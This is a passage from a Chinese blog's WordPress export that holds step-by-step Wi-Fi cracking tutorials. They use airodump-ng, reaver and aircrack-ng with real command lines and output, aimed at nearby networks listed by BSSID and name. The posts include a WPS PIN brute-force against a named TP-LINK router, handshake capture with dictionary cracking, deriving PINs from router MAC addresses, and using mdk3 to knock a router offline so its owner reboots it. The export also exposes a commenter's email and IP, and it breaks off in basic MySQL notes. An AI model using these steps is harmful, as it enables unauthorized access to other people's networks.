 B0:48:7A:5D:22:EA  -51       36        0    0   6  54e. WPA2 CCMP   PSK  TP-LINK_1202
 C4:CA:D9:6D:6F:B0  -52       30       10    0  11  54e. OPN              ChinaNet
 8C:21:0A:8F:2F:1A  -54       18        0    0   1  54e. WPA2 CCMP   PSK  hechengyv
 E0:05:C5:C5:70:E8  -55       15        0    0   4  54e. WPA2 CCMP   PSK  wtangqiu
 C8:3A:35:55:D1:D8  -55       20        2    0   7  54e. WPA  CCMP   PSK  Tenda_55D1D8
 8C:21:0A:84:89:8C  -56       24        0    0   1  54e. WPA2 CCMP   PSK  BATE
 C4:CA:D9:6D:5F:60  -55       15        2    0   6  54e. OPN              ChinaNet
 EC:17:2F:54:01:2E  -56       13        0    0   1  54e. WPA2 CCMP   PSK  diguadawang
 5C:63:BF:74:56:52  -53       18        2    0   1  54e. WPA2 CCMP   PSK  cocohe
 08:10:76:40:C2:92  -58       21        0    0   1  54e  WPA2 CCMP   PSK  flytv
 E0:05:C5:C0:60:42  -56       21        0    0   9  54e. WPA2 CCMP   PSK  HZLYL
 38:83:45:C1:BE:F8  -59       14        1    0   6  54e. WPA2 CCMP   PSK  TICO081122
 C4:CA:D9:74:B3:80  -57       13        1    0  11  54e. OPN              ChinaNet
 EC:88:8F:AB:F6:5E  -59        5        0    0   4  54e. WPA2 CCMP   PSK  TP-LINK_ABF65E
 6C:E8:73:B0:67:78  -59        8        0    0   6  54e. WPA2 CCMP   PSK  WJJ~LOVE~WW
 C8:3A:35:19:D6:78  -61        9        0    0   1  54e  WPA  CCMP   PSK  Tenda_19D678
 E0:05:C5:19:9C:04  -61       18        0    0   7  54 . WPA2 CCMP   PSK  1-14-1-602
 C8:64:C7:5A:46:16  -60        3        0    0  11  54e  WPA  CCMP   PSK  STB_CDCF
 6C:E8:73:45:A7:E6  -60        6        0    0   4  54e. WPA2 CCMP   PSK  TP-LINK_45A7E6
 1C:BD:B9:F5:E5:D7  -61       16        0    0   1  54   WPA2 CCMP   PSK  D-Link_DIR-600M
 C4:CA:D9:6D:6E:B0  -61       12        0    0   1  54e. OPN              ChinaNet
 C8:64:C7:5A:46:15  -61       17        0    0  11  54e  WPA  CCMP   PSK  VIDEOPHONE_CDCF
 C8:64:C7:5A:46:17  -61       12        0    0  11  54e  WPA  CCMP   PSK  BACKUP
 EC:88:8F:99:75:F2  -61        5        0    0   4  54e. WPA2 CCMP   PSK  6786
 8C:21:0A:1E:60:26  -61        3        0    0   1  54e. WPA2 CCMP   PSK  yue
 00:23:CD:5B:A7:9E  -61        2        0    0   6  54 . WEP  WEP         1203 wireless
 14:E6:E4:44:9B:8E  -62        6        0    0   4  54e. WPA2 CCMP   PSK  bujiankai
 00:1D:0F:81:72:06  -62        4        0    0   6  54 . WEP  WEP         Line
 FC:C8:97:94:B6:C8  -62        7        0    0  11  54e  WPA  CCMP   PSK  CU_6cmn
 B0:48:7A:2A:1B:E6  -62        7        0    0   6  54e. WPA  CCMP   PSK  302
 EC:88:8F:8F:CD:BB  -62       11        0    0  11  54e. WPA2 CCMP   PSK  haloso2
 EC:17:2F:AC:44:A2  -62        7        0    0   1  54e. WPA2 CCMP   PSK  1-401
 C8:64:C7:5A:46:14  -63       24        0    0  11  54e  WPA  CCMP   PSK  CU_CDCF
 38:83:45:B5:E3:96  -63        6        0    0   1  54e. WPA2 CCMP   PSK  TP-LINK_B5E396
 C8:3A:35:2B:35:68  -63       11        0    0  11  54e  WPA2 CCMP   PSK  Tenda_2B3568
 00:27:19:6D:4A:5A  -63        1        0    0  11  54e. WPA2 CCMP   PSK  JUJIA-FOGUANG
 FC:C8:97:94:B6:CB  -65        9        0    0  11  54e  WPA  CCMP   PSK  BACKUP
 FC:C8:97:94:B6:C9  -63       15        0    0  11  54e  WPA  CCMP   PSK  VIDEOPHONE_6cmn
 C8:3A:35:06:63:B0  -64        3        0    0   1  54e  WPA2 CCMP   PSK  Tenda_0663B0
 8C:21:0A:B0:22:92  -64        3        0    0   1  54e. WPA2 CCMP   PSK  810
 14:E6:E4:4F:DE:FE  -64        3        0    0   1  54e. WPA2 CCMP   PSK  YM+ZM
 FC:C8:97:94:B6:CA  -65       13        0    0  11  54e  WPA  CCMP   PSK  STB_6cmn
 C8:3A:35:52:70:60  -65        2        0    0  11  54e. WPA  CCMP   PSK  Tenda_527060
 00:26:5A:B3:08:7E  -65        8        0    0  13  54e  WPA2 CCMP   PSK  503
 F4:EC:38:56:6B:DE  -62        2        0    0   9  54e. WPA2 CCMP   PSK  WTO
 14:D6:4D:A0:19:60  -62        3        0    0  11  54e  WPA2 TKIP   PSK  wang~XB
 C4:CA:D9:6D:6F:40  -62        1        0    0   1  54e. OPN              ChinaNet </span></pre>

ctrl+c^  结束
话说小区里的无线信号还真是多呢……主要是alfa 的卡给力……呵呵
5.使用reaver 破解开启wps功能的路由器密码
比如这条，信号还不错

<pre class="prettyprint lang-bsh prettyprinted"><span class="lit">8C</span><span class="pun">:</span><span class="lit">21</span><span class="pun">:</span><span class="lit">0A</span><span class="pun">:</span><span class="lit">5F</span><span class="pun">:</span><span class="pln">A2</span><span class="pun">:</span><span class="pln">FA </span><span class="pun">-</span><span class="lit">35</span> <span class="lit">28</span> <span class="lit">0</span> <span class="lit">0</span> <span class="lit">1</span> <span class="lit">54e</span><span class="pun">.</span><span class="pln"> WPA2 CCMP PSK TP</span><span class="pun">-</span><span class="pln">LINK_5FA2FA
root@home</span><span class="pun">:~/</span><span class="pln">soft</span><span class="pun">/</span><span class="pln">reaver</span><span class="pun">-</span><span class="lit">1.4</span><span class="com">#  reaver  -i  mon0  -b 8C:21:0A:5F:A2:FA  -a  -S  -vv  -d2  -t 5 -c 1</span>
<span class="typ">Reaver</span><span class="pln"> v1</span><span class="pun">.</span><span class="lit">4</span> <span class="typ">WiFi</span> <span class="typ">Protected</span> <span class="typ">Setup</span> <span class="typ">Attack</span> <span class="typ">Tool</span>
<span class="typ">Copyright</span> <span class="pun">(</span><span class="pln">c</span><span class="pun">)</span> <span class="lit">2011</span><span class="pun">,</span> <span class="typ">Tactical</span> <span class="typ">Network</span> <span class="typ">Solutions</span><span class="pun">,</span> <span class="typ">Craig</span> <span class="typ">Heffner</span> <span class="pun">&amp;</span><span class="pln">lt</span><span class="pun">;</span><span class="pln">cheffner@tacnetsol</span><span class="pun">.</span><span class="pln">com</span><span class="pun">&amp;</span><span class="pln">gt</span><span class="pun">;</span>
<span class="pun">[+]</span> <span class="typ">Switching</span><span class="pln"> mon0 to channel </span><span class="lit">1</span>
<span class="pun">[+]</span> <span class="typ">Waiting</span> <span class="kwd">for</span><span class="pln"> beacon from </span><span class="lit">8C</span><span class="pun">:</span><span class="lit">21</span><span class="pun">:</span><span class="lit">0A</span><span class="pun">:</span><span class="lit">5F</span><span class="pun">:</span><span class="pln">A2</span><span class="pun">:</span><span class="pln">FA
</span><span class="pun">[+]</span> <span class="typ">Associated</span><span class="pln"> with </span><span class="lit">8C</span><span class="pun">:</span><span class="lit">21</span><span class="pun">:</span><span class="lit">0A</span><span class="pun">:</span><span class="lit">5F</span><span class="pun">:</span><span class="pln">A2</span><span class="pun">:</span><span class="pln">FA </span><span class="pun">(</span><span class="pln">ESSID</span><span class="pun">:</span><span class="pln"> TP</span><span class="pun">-</span><span class="pln">LINK_5FA2FA</span><span class="pun">)</span>
<span class="pun">[+]</span> <span class="typ">Trying</span><span class="pln"> pin </span><span class="lit">12345670</span>
<span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> EAPOL START request
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> identity request
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> identity response
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> M1 message
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> M2 message
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> M3 message
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> M4 message
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> WSC NACK
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> WSC NACK
</span><span class="pun">[+]</span> <span class="typ">Trying</span><span class="pln"> pin </span><span class="lit">00005678</span>
<span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> EAPOL START request
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> identity request
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> identity response
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> M1 message
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> M2 message
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> M3 message
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> M4 message
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> WSC NACK
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> WSC NACK
</span><span class="pun">[+]</span> <span class="typ">Trying</span><span class="pln"> pin </span><span class="lit">01235678</span>
<span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> EAPOL START request
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> identity request
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> identity response
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> M1 message
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> M2 message
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> M3 message
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> M4 message
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> WSC NACK
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> WSC NACK
</span><span class="pun">[+]</span> <span class="typ">Trying</span><span class="pln"> pin </span><span class="lit">11115670</span>
<span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> EAPOL START request
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> identity request
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> identity response
</span><span class="pun">[+]</span> <span class="typ">Received</span><span class="pln"> M1 message
</span><span class="pun">[+]</span> <span class="typ">Sending</span><span class="pln"> M2 message
</span><span class="pun">^</span><span class="pln">C</span></pre>

这样就开始破解了哦，耐心等待结果就好了……不要太邪恶哦。做做测试还是可以的，要做个好童鞋……
##########################################################################
<strong>附上reaver调整参数的一些小技巧</strong>
reaver:

<pre class="prettyprint lang-html prettyprinted"><span class="pln">-i 监听后接口名称
-b 目标mac地址
-a 自动检测目标AP最佳配置
-S 使用最小的DH key（可以提高PJ速度）
-vv 显示更多的非严重警告
-d 即delay每穷举一次的闲置时间 预设为1秒
-t 即timeout每次穷举等待反馈的最长时间
-c指定频道可以方便找到信号，如-c1 指定1频道，大家查看自己的目标频道做相应修改 （非TP-LINK路由推荐–d9 –t9参数防止路由僵死
示例：
reaver -i mon0 -b MAC -a -S –d9 –t9 -vv）
应因状况调整参数（-c后面都已目标频道为1作为例子）
目标信号非常好: reaver -i mon0 -b MAC -a -S -vv -d0 -c 1
目标信号普通: reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1
目标信号一般: reaver -i mon0 -b MAC -a -S -vv -d5 -c 1</span></pre>

&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>74</wp:post_id>
		<wp:post_date><![CDATA[2015-10-13 09:17:57]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-13 01:17:57]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[raspberry-pi%e4%b8%8b%e8%b7%91aircrack%e5%92%8creaver%e7%a0%b4%e8%a7%a3%e8%b7%af%e7%94%b1%e5%99%a8pin%e7%a0%81]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="aircrack"><![CDATA[aircrack]]></category>
		<category domain="post_tag" nicename="pin"><![CDATA[pin]]></category>
		<category domain="post_tag" nicename="raspberry-pi"><![CDATA[Raspberry Pi]]></category>
		<category domain="post_tag" nicename="reaver"><![CDATA[reaver]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%a1%ac%e4%bb%b6%e8%ae%be%e5%a4%87"><![CDATA[硬件设备]]></category>
		<category domain="category" nicename="%e8%bd%af%e4%bb%b6%e5%ba%94%e7%94%a8"><![CDATA[软件应用]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[229]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Aircrack-ng扫描、抓握手包、跑字典破Wifi密码</title>
		<link>https://www.nervgeek.com/2015/10/13/aircrack-ng%e6%89%ab%e6%8f%8f%e3%80%81%e6%8a%93%e6%8f%a1%e6%89%8b%e5%8c%85%e3%80%81%e8%b7%91%e5%ad%97%e5%85%b8%e7%a0%b4wifi%e5%af%86%e7%a0%81/</link>
		<pubDate>Tue, 13 Oct 2015 10:10:31 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=77</guid>
		<description></description>
		<content:encoded><![CDATA[简记：
插上网卡，先运行

<pre>airmon-ng check kill
</pre>

再运行

<pre>airmon-ng start wlan0(无线网卡)
</pre>

准备完毕开始扫描附近wifi

<pre>airodump-ng wlan0mon
</pre>

会显示以下结果
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/5f27dde10bfa8adadfd122521b0a01ef.png"><img class="alignnone size-full wp-image-79" src="https://www.nervgeek.com/wp-content/uploads/2016/01/5f27dde10bfa8adadfd122521b0a01ef.png" alt="wifi" width="885" height="483" /></a>
<!--more-->
<strong>重要的几个信息：</strong>
BSSID：网卡物理地址
CH：频道
MB：54e.（有小数点代表开启wps功能）
ENC：加密方式
ESSID：wifi名称
下面显示的信息是哪个wifi有人在使用，有人在使用的wifi才能获取到握手包。
&nbsp;
例如我想抓dlink的握手包
需要记下他的频道，MAC地址
开始抓握手包

<pre>airodump-ng -c 11 --bssid 78:54:2E:5A:37:50 -w moni wlan0mon
</pre>

-c 11 ：11频道
--bssid ：MAC地址
-w ：文件保存名称，保存在当前目录下
wlan0mon ：自己的无线网卡
<code>-C</code>参数是选择目标信道。如果该信道就目标一个AP使用的话不用加上<code>--bssid，</code>这个参数是为了跟精准的锁定目标，<code>-w</code> 是保存握手包的名字.获取后会在当前目录生成一个<code>mobi-01.cap</code>的握手包。
&nbsp;
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/1bfdfaef43cb8cd63c7a004b39a3d476.png"><img class="alignnone size-full wp-image-80" src="https://www.nervgeek.com/wp-content/uploads/2016/01/1bfdfaef43cb8cd63c7a004b39a3d476.png" alt="wifi2" width="806" height="264" /></a>
Beacons就是次数，一般2000次左右就应该抓到了。
在当前目录下ls，会发现已经保存好了信息。
&nbsp;
当抓得差不多，就可以开始跑字典了
事先准备好密码字典，我保存在root下。
输入命令

<pre>aircrack-ng -w /root/rklogin.txt moni-01.cap
</pre>

&nbsp;
&nbsp;
然后就等他把密码跑出来吧
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/30b7b9c1d00523e945e08cdb9f290f35.png"><img class="alignnone size-full wp-image-83" src="https://www.nervgeek.com/wp-content/uploads/2016/01/30b7b9c1d00523e945e08cdb9f290f35.png" alt="wifi3" width="720" height="406" /></a>
跑出来了！密码是123654789]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>77</wp:post_id>
		<wp:post_date><![CDATA[2015-10-13 18:10:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-13 10:10:31]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[aircrack-ng%e6%89%ab%e6%8f%8f%e3%80%81%e6%8a%93%e6%8f%a1%e6%89%8b%e5%8c%85%e3%80%81%e8%b7%91%e5%ad%97%e5%85%b8%e7%a0%b4wifi%e5%af%86%e7%a0%81]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="aircrack-ng"><![CDATA[aircrack-ng]]></category>
		<category domain="post_tag" nicename="wifi"><![CDATA[wifi]]></category>
		<category domain="post_tag" nicename="%e6%8f%a1%e6%89%8b%e5%8c%85"><![CDATA[握手包]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%a0%b4%e8%a7%a3"><![CDATA[破解]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
		<category domain="category" nicename="%e8%bd%af%e4%bb%b6%e5%ba%94%e7%94%a8"><![CDATA[软件应用]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[465]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>6</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[61.146.118.3]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2015-10-13 19:03:56]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2015-10-13 11:03:56]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[:a8:]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					</item>
					<item>
		<title>aircrack-ng扫描+reaver跑pin破解开启wps功能的Wifi</title>
		<link>https://www.nervgeek.com/2015/10/13/aircrack-ng%e6%89%ab%e6%8f%8freaver%e8%b7%91pin%e7%a0%b4%e8%a7%a3%e5%bc%80%e5%90%afwps%e5%8a%9f%e8%83%bd%e7%9a%84wifi/</link>
		<pubDate>Tue, 13 Oct 2015 11:27:42 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=87</guid>
		<description></description>
		<content:encoded><![CDATA[插上无线网卡，先运行下列代码，避免无线网卡被使用。

<pre>airmon-ng check kill</pre>

再运行

<pre>airmon-ng start wlan0(无线网卡)</pre>

准备完毕开始扫描附近wifi

<pre>airodump-ng wlan0mon</pre>

出现以下画面
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/8a6f503814aa4a7cd863e68c7778fbdb.png"><img class="alignnone size-full wp-image-88" src="https://www.nervgeek.com/wp-content/uploads/2016/01/8a6f503814aa4a7cd863e68c7778fbdb.png" alt="pin" width="936" height="386" /></a>
<!--more-->
在MB这行假如显示“54e.”，带点的“.”表示能跑出pin码。使用

<pre>wash -i wlan0mon -C
</pre>

可查看是否开启了wps功能。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/1ce8f9c8c598a33e655651c0899ef7bc.png"><img class="alignnone size-full wp-image-89" src="https://www.nervgeek.com/wp-content/uploads/2016/01/1ce8f9c8c598a33e655651c0899ef7bc.png" alt="pin2" width="1028" height="330" /></a>
选好你需要破解的wifi，输入

<pre>Reaver -c -i wlan0mon -b xx:xx:xx:xx -vv</pre>

<pre>-i 监听后接口名称
-b 目标mac地址
-a 自动检测目标AP最佳配置
-S 使用最小的DH key（可以提高PJ速度）
-vv 显示更多的非严重警告
-d 即delay每穷举一次的闲置时间 预设为1秒
-t 即timeout每次穷举等待反馈的最长时间
-c 指定频道可以方便找到信号，如-c1 指定1频道，大家查看自己的目标频道做相应修改 （非TP-LINK路由推荐–d9 –t9 参数防止路由僵死
</pre>

输入命令开始跑pin<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/3831c0e6dade0102fbc517b4e69470b8.png"><img class="alignnone size-full wp-image-90" src="https://www.nervgeek.com/wp-content/uploads/2016/01/3831c0e6dade0102fbc517b4e69470b8.png" alt="pin3 (1)" width="1175" height="667" /></a>
接下来就只是等待了。
&nbsp;
接着抖一些干货：
磊科和Dlink的某些路由器不能加-S参数来优化，否则不会出正确的pin码。如果有信号跑到99.99%还是没出密码，就可以考虑去掉-S参数。或者要跑reaver之前用wireshark分析下包，判断路由器的品牌。
信号不好的时候，可能会出现正确的pin码验证不成功即漏码，强制指定-n参数即可。
如果实在没把握对节奏pin死了，可以尝试用mdk3来攻击对方路由器，迫使路由器主人重启路由器。
无线路由器前6位MAC地址是C83A35，00B00C(腾达)或081075，081076 (磊科部分可以)的，可以根据MAC后六位算出正确的pin码， 用自带的科学计算器就能准确算出来。
把计算器调为程序员型，选十六进制，比如08:10:76:0F:B3:5C这个MAC地址，取后六位，输入完后选十进制就算出pin码前7位了。然后用-p参数指定7位pin码就可以出密码了，第8位程序会自动补全。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/7bfc85c0d74ff05806e0b5a0fa0c1df1-1.png" data-lightbox="image_lg"><img class="attachment-full" title="11" src="https://www.nervgeek.com/wp-content/uploads/2016/01/7bfc85c0d74ff05806e0b5a0fa0c1df1-1.png" alt="11" width="423" height="389" data-bd-imgshare-binded="1" /></a>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/01/c8b2f17833a4c73bb20f88876219ddcd.png" data-lightbox="image_lg"><img class="attachment-full" title="12" src="https://www.nervgeek.com/wp-content/uploads/2016/01/c8b2f17833a4c73bb20f88876219ddcd.png" alt="12" width="423" height="389" data-bd-imgshare-binded="1" /></a>
总结一下，如果是WEP加密，用minidwep挂着一定可以出密码，如果是wpa可以先抓握手包包，然后用hashcat跑字典，同时可以用 reaver跑pin码，如果hashcat搞定了就关掉reaver吧，不然你就老老实实等吧，reaver平均速度要半天搞不好要过夜，所以 reaver还是适合定点投放啊= =#这里就不重复说inflator的用法了，reaver的界面版，操作更简单了，如果你掌握了命令行的reaver，inflator用起来是毫无压 力的。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>87</wp:post_id>
		<wp:post_date><![CDATA[2015-10-13 19:27:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-13 11:27:42]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[aircrack-ng%e6%89%ab%e6%8f%8freaver%e8%b7%91pin%e7%a0%b4%e8%a7%a3%e5%bc%80%e5%90%afwps%e5%8a%9f%e8%83%bd%e7%9a%84wifi]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="aircrack-ng"><![CDATA[aircrack-ng]]></category>
		<category domain="post_tag" nicename="pin"><![CDATA[pin]]></category>
		<category domain="post_tag" nicename="reaver"><![CDATA[reaver]]></category>
		<category domain="post_tag" nicename="wifi"><![CDATA[wifi]]></category>
		<category domain="post_tag" nicename="wps"><![CDATA[wps]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%a0%b4%e8%a7%a3"><![CDATA[破解]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[443]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>MySQL基础语句</title>
		<link>https://www.nervgeek.com/2015/10/14/117/</link>
		<pubDate>Wed, 14 Oct 2015 06:40:45 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=117</guid>
		<description></description>
		<content:encoded><![CDATA[<h3><span data-wiz-span="data-wiz-span"><b>登陆MySQL：</b></span></h3>

<div><span data-wiz-span="data-wiz-span">mysql [</span><span data-wiz-span="data-wiz-span">-h 主机地址</span><span data-wiz-span="data-wiz-span">] -u 用户名 -p</span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<h3><span data-wiz-span="data-wiz-span"><b>修改root的登陆密码：</b></span></h3>

<div><span data-wiz-span="data-wiz-span">方法一：</span></div>

<div><span data-wiz-span="data-wiz-span">mysqladmin -u 用户名 -p 旧密码 password 新密码(</span><span data-wiz-span="data-wiz-span">首先在DOS下进入目录mysql\bin，然后键入以下命令</span><span data-wiz-span="data-wiz-span">)</span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span">方法二：</span><span data-wiz-span="data-wiz-span">
</span></div>

<div><span data-wiz-span="data-wiz-span">SET PASSWORD FOR 'root'@'localhost' = PASSWORD('newpass');</span><span data-wiz-span="data-wiz-span">
</span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<!--more-->

<div><span data-wiz-span="data-wiz-span"> </span></div>

<h3><span data-wiz-span="data-wiz-span"><b>添加一个新用户：</b></span></h3>

<div><span data-wiz-span="data-wiz-span">grant select on 数据库.* to 用户名@登录主机 identified by “密码”</span><span data-wiz-span="data-wiz-span">
</span></div>

<div></div>

<div><span data-wiz-span="data-wiz-span">在任何地方都能登陆，</span><span data-wiz-span="data-wiz-span">并对所有数据库有查询、插入、修改、删除的权限</span><span data-wiz-span="data-wiz-span">：</span></div>

<div><span data-wiz-span="data-wiz-span">grant select,insert,update,delete on *.* to [email=用户名@”%]用户名@”%[/email]” Identified by “密码”;</span></div>

<div></div>

<div><span data-wiz-span="data-wiz-span">只允许在localhost上登录</span><span data-wiz-span="data-wiz-span">，并可以对数据库mydb进行查询、插入、修改、删除的操作：</span></div>

<div><span data-wiz-span="data-wiz-span">grant select,insert,update,delete on mydb.* to [email=</span><span data-wiz-span="data-wiz-span">用户名</span><span data-wiz-span="data-wiz-span">@localhost]</span><span data-wiz-span="data-wiz-span">用户名</span><span data-wiz-span="data-wiz-span">@localhost[/email] identified by “密码”;</span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

<div><span data-wiz-span="data-wiz-span"> </span></div>

